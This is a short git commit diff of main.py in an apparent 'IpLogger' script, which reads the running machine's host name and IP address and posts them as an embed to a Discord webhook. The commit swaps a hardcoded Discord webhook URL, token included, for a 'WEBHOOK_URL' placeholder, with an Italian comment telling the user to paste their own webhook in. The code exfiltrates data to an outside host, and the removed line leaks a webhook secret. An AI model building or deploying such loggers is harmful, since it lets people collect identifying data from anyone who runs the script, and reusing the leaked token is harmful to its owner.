f88a06faee82e7641f2ac701c9ab1dd383b0ef37
Vladimir Ryabko <73772934+VladimirRyabko@users.noreply.github.com>
2024-07-01 19:49:55 +0200

    main.py

--- main.py
+++ main.py
@@ -7,7 +7,7 @@ print("Host name: ", host_name)
 print("IP adress: ", ip_adress)
 
 content = "Placeholder Message"
-webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1256356494300024887/OCVv5VlqgozqYoc2mcn_DjEUUdT2LC3kTM53Qm3ykNXalMp1cm00taLhT_X9k009RBIw" , usernsme="IpLogger", content=content)
+webhook = DiscordWebhook(url="WEBHOOK_URL" , usernsme="IpLogger", content=content) #METTI IL WEBHOOK URL NEGLI APICI
 embed = DiscordEmbed(title="IP: " + ip_adress + " | Host: " + host_name, color = 123123)
 webhook.add_embed(embed)
 response = webhook.execute()
